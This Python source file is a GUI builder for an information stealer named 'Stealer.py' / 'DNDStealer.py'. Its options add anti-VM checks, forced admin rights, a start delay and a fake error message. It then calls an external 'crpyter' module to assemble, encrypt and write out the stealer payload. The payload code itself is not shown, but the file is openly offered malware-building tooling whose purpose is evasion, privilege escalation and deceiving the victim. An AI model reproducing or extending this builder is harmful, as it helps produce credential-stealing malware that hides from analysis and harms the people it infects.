import tkinter as tk
import customtkinter
from tkinter import filedialog
import os
import crpyter

import time
import ctypes
customtkinter.set_appearance_mode("Dark")  
customtkinter.set_default_color_theme("blue")


root = customtkinter.CTk()  
root.title("Stealer.py - Builder")


root.geometry("300x300")
root.resizable(False, False)




titleLabel = customtkinter.CTkLabel(root, text="Stealer.py", font=("Arial", 20),fg_color="black",width=280,corner_radius=10)
titleLabel.grid(row=1, column=1, sticky="w", padx=10, pady=10)


    
antiVMstatus=tk.BooleanVar()

runasAdminstatus=tk.BooleanVar()
fakeErrorstatus=tk.BooleanVar()
fakeErrorMessage=tk.StringVar()


startDelay=tk.BooleanVar()





optionsLabel = customtkinter.CTkLabel(root, text="Options:", font=("Arial", 20))
optionsLabel.grid(row=3, column=1, sticky="w", padx=10, pady=10)

antiVM = customtkinter.CTkCheckBox(root, text="Anti-VM", variable=antiVMstatus)
antiVM.grid(row=5, column=1, sticky="w", padx=10, pady=5)
runasAdmin = customtkinter.CTkCheckBox(root, text="Run as Admin", variable=runasAdminstatus)
runasAdmin.grid(row=6, column=1, sticky="w", padx=10, pady=5)
fakeError = customtkinter.CTkCheckBox(root, text="Fake Error", variable=fakeErrorstatus)
fakeError.grid(row=7, column=1, sticky="w", padx=10, pady=5)


startDelay = customtkinter.CTkCheckBox(root, text="Start Delay", variable=startDelay)
startDelay.grid(row=8, column=1, sticky="w", padx=10, pady=5)






def crypt():

        codePlain = ""
        crpyterdnd=crpyter.CrypterDnd()
        codePlain=crpyterdnd.virusMain()+codePlain
        if runasAdminstatus.get():
            runasAdminCode=crpyterdnd.forceAdmin()
            codePlain=runasAdminCode+codePlain
        if antiVMstatus.get():
            antiVMCode=crpyterdnd.getAntiVMCode()
            codePlain=antiVMCode+codePlain

        codePlain=crpyterdnd.cryptoFinal(codePlain)
        if startDelay.get():
             codePlain=crpyterdnd.delayCode()+codePlain


        codePlain=crpyterdnd.getImportCode()+codePlain
        if fakeErrorstatus.get():
            fakeErrorCode=crpyterdnd.fakeError()
            codePlain=codePlain+fakeErrorCode
        
        
        timeNow=time.strftime("%d.%m.%Y_%H_%M_%S")
        name="build"
        finalName=timeNow+"_"+name+".py"
        with open(finalName, "w",encoding="utf-8") as f:
            f.write(codePlain)
        msg=ctypes.windll.user32.MessageBoxW(0, "Builded!", "DNDStealer.py", 0)
        root.destroy()

CrypteButton = customtkinter.CTkButton(root, text="BUILD", command=crypt, width=280)
CrypteButton.grid(row=9, column=1, sticky="w", padx=10, pady=10)
        
        


        



       
 
root.mainloop()